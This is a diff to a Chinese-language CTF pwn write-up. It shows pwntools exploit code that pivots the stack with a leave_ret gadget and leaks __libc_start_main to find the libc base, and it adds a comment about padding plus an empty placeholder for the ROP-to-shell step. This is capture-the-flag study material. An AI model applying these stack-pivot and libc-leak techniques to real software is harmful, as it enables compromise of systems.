@@ -234,6 +234,7 @@ log.success('stack_addr: ' + hex(stack_addr))
 ```python
 # payload4开始构造栈迁移泄漏libc基址
 payload4 = p64(stack_addr + 0xb0) + p64(func_base + 0x101229) + b'a' * 0x10 + p64(stack_addr - 0x30) + p64(leave_ret) + b'\x00' * 0x8
+# 这里payload4还要填充八位是为了将read读满，不然下面的payload5没做延迟在调试的时候会同步输入导致payload5里差了八位。
 p.sendafter(b'berial: ', payload4)
 # payload4已经将栈迁移到位置，payload5泄漏__libc_start_main地址
 payload5 = b'a' * (0x20 - 8 - 1) + b'd'
@@ -244,7 +245,11 @@ __libc_start_main_base = __libc_start_main_add - 128
 log.success('__libc_start_main_add: ' + hex(__libc_start_main_add))
 log.success('__libc_start_main_base: ' + hex(__libc_start_main_base))
 ```
+![[Pasted image 20250211193505.png]]
+第五步，构造ROP获取shell。
+```python
 
+```
 ## unjoke
 
 ## Natro
